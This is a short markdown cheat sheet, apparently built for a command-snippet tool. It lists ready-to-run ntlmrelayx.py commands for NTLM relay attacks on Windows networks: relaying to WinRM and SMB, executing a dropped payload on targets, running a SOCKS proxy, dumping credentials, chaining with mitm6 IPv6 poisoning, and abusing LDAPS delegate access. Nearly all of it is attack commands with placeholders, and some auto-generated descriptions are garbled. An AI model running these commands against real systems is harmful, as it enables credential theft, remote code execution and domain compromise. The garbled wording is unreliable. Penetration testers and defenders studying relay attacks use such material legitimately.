# Ntlmrelayx

## ntlmrelayx - coercion - remote

### Relay to WinRM

Enable relay to WinRM with Ntlmrelayx.

```sh title:"Ntlmrelayx Enable Relay to WinRM"
ntlmrelayx.py -smb2support -t winrms://$rhost_ip
```
<!-- cheat
import domain_ip
-->

### Relay to SMB + drop payload

Enumerate relay to SMB + drop payload with Ntlmrelayx.

```sh title:"Ntlmrelayx Enumerate Relay to SMB + Drop Payload"
ntlmrelayx.py -tf $targets_file -smb2support -e $payload_file
```
<!-- cheat
var targets_file
var payload_file
-->

### Relay + SOCKS proxy

Run relay + SOCKS proxy with Ntlmrelayx.

```sh title:"Ntlmrelayx Run Relay + SOCKS Proxy"
ntlmrelayx.py -tf $targets_file -socks -smb2support
```
<!-- cheat
var targets_file
-->

### Relay + dump

Dump relay + dump with Ntlmrelayx.

```sh title:"Ntlmrelayx Dump Relay + Dump"
ntlmrelayx.py -tf $targets_file -smb2support
```
<!-- cheat
var targets_file
-->

## ntlmrelayx - mitm6 chain

### Relay to SMB target

Enumerate relay to SMB target with Ntlmrelayx.

```sh title:"Ntlmrelayx Enumerate Relay to SMB Target"
ntlmrelayx.py -6 -wh $lhost -t smb://$rhost_ip -l /tmp -socks -debug
```
<!-- cheat
import tun_ip
import domain_ip
-->

### Delegate access via LDAPS

Run delegate access via LDAPS with Ntlmrelayx.

```sh title:"Ntlmrelayx Run Delegate Access Via LDAPS"
ntlmrelayx.py -t ldaps://$rhost_ip -wh $lhost --delegate-access
```
<!-- cheat
import tun_ip
import domain_ip
-->

